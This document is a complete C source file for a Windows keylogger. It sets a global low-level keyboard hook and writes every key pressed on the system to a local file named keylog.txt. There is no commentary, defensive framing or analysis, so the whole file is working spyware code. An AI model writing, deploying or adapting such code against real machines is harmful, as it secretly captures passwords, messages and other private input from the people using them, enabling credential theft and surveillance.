#include <windows.h>
#include <stdio.h>

FILE *logfile;

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        if (wParam == WM_KEYDOWN) {
            KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *)lParam;
            DWORD vkCode = pKeyBoard->vkCode;
            fprintf(logfile, "%c", vkCode);
            fflush(logfile);
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main() {
    logfile = fopen("keylog.txt", "w");
    if (!logfile) return 1;

    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (!hook) return 1;

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    fclose(logfile);
    return 0;
}

